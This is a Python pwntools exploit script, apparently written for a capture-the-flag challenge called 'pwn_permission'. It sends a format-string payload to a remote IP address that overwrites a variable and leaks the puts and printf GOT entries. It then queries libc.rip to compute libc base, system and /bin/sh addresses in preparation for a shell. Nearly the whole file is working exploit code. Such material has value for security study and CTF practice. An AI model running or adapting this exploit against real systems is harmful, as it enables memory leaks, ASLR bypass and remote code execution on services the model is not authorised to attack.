from pwn import *

context(arch='i386', os='linux', log_level='info')

elf = ELF('pwn_permission')

# Use format string to leak multiple GOT entries
# We can only leak one per format string call, but we can use
# the format string %s to read from different addresses

# The format string buffer is 32 bytes
# Format: %K$c%N$hhn + padding + addr1 + addr2 + %M$s%P$s
# But this is complex. Let me try a simpler approach.

# Actually, let me use the format string to leak puts AND printf
# in the same format string

target_val_addr = 0x804c030
puts_got = elf.got['puts']         # 0x804c014
printf_got = elf.got['printf']     # 0x804c010

# Format string: set target_val=5, leak puts, leak printf
# Positions:
# Position 7 = bytes 12-15 (after %5c%7$hhnAAA = 9+3=12 bytes)
# Position 8 = bytes 16-19
# Position 9 = bytes 20-23

fmt_payload = b'%5c%7$hhnAAA'      # 12 bytes: write 5 to target_val
fmt_payload += p32(target_val_addr) # 4 bytes: position 7
fmt_payload += p32(puts_got)        # 4 bytes: position 8
fmt_payload += p32(printf_got)      # 4 bytes: position 9
fmt_payload += b'%8$s%9$s'          # 8 bytes: leak puts and printf

log.info(f"Format string length: {len(fmt_payload)}")  # Should be 32

import time

conn = remote('39.96.193.120', 10000)
conn.recv(timeout=5)
conn.send(fmt_payload)
time.sleep(2)
response = conn.recv(timeout=5)

log.info(f"Response: {response}")

if b'Input:' in response:
    log.success("target_val set to 5!")
    
    # Extract leaks
    idx = response.find(b'here.\n')
    after_here = response[idx+6:]
    input_idx = after_here.find(b'Input:')
    fmt_output = after_here[:input_idx]
    
    # Format output structure:
    # 5 chars from %5c + "AAA" + target_val_addr(4) + puts_got(4) + printf_got(4) = 20 bytes header
    # Then puts_addr (4 bytes, until null) + printf_addr (4 bytes, until null)
    
    log.info(f"Format output hex: {fmt_output.hex()}")
    
    header_size = 5 + 3 + 4 + 4 + 4  # 20 bytes
    if len(fmt_output) > header_size:
        leaked_data = fmt_output[header_size:]
        log.info(f"Leaked data hex: {leaked_data.hex()}")
        
        # The puts address is first (4 bytes, might have trailing bytes before null)
        # Then the printf address
        # Both are printed as strings by %s, so they stop at null bytes
        
        # Let me try to parse them
        # puts address in little-endian: e.g., \xe0\x41\xdd\xf7
        # This has no null bytes until the 5th byte, so %s prints 4 bytes
        
        # But there might be extra bytes between the two addresses
        # Let me just try to find two valid-looking addresses
        
        possible_addrs = []
        i = 0
        while i < len(leaked_data) - 3:
            addr = u32(leaked_data[i:i+4])
            if 0xf7000000 < addr < 0xf7ffffff:
                possible_addrs.append((i, addr))
                i += 4
            else:
                i += 1
        
        log.info(f"Possible addresses found: {len(possible_addrs)}")
        for offset, addr in possible_addrs:
            log.info(f"  offset {offset}: 0x{addr:x}")
        
        if len(possible_addrs) >= 2:
            puts_leak = possible_addrs[0][1]
            printf_leak = possible_addrs[1][1]
            
            log.info(f"\nputs: 0x{puts_leak:x}")
            log.info(f"printf: 0x{printf_leak:x}")
            log.info(f"printf - puts = 0x{printf_leak - puts_leak:x}")
            
            # Query libc.rip
            import requests
            api_url = "https://libc.rip/api/find"
            data = {
                "symbols": {
                    "puts": hex(puts_leak & 0xfff),
                    "printf": hex(printf_leak & 0xfff),
                }
            }
            
            try:
                resp = requests.post(api_url, json=data, timeout=10)
                if resp.status_code == 200:
                    libs = resp.json()
                    log.info(f"\nFound {len(libs)} matching libc versions:")
                    seen = set()
                    for lib in libs:
                        lib_id = lib.get('id', 'unknown')
                        symbols = lib.get('symbols', {})
                        puts_off = symbols.get('puts', '0')
                        printf_off = symbols.get('printf', '0')
                        system_off = symbols.get('system', '0')
                        binsh_off = symbols.get('str_bin_sh', '0')
                        
                        key = (puts_off, system_off, binsh_off)
                        if key in seen:
                            continue
                        seen.add(key)
                        
                        # Verify the offset difference matches
                        if isinstance(puts_off, str) and isinstance(printf_off, str):
                            try:
                                po = int(puts_off, 16)
                                pro = int(printf_off, 16)
                                expected_diff = pro - po
                                actual_diff = printf_leak - puts_leak
                                if expected_diff == actual_diff:
                                    log.success(f"\n{lib_id}:")
                                    log.info(f"  puts: 0x{puts_off}")
                                    log.info(f"  printf: 0x{printf_off}")
                                    log.info(f"  system: 0x{system_off}")
                                    log.info(f"  str_bin_sh: 0x{binsh_off}")
                                    
                                    # Calculate addresses
                                    libc_base = puts_leak - po
                                    log.info(f"  libc_base: 0x{libc_base:x}")
                                    
                                    if isinstance(system_off, str):
                                        sys_addr = libc_base + int(system_off, 16)
                                        log.info(f"  system: 0x{sys_addr:x}")
                                    if isinstance(binsh_off, str):
                                        bsh_addr = libc_base + int(binsh_off, 16)
                                        log.info(f"  /bin/sh: 0x{bsh_addr:x}")
                            except:
                                pass
                else:
                    log.error(f"API error: {resp.status_code}")
            except Exception as e:
                log.error(f"API query failed: {e}")

conn.close()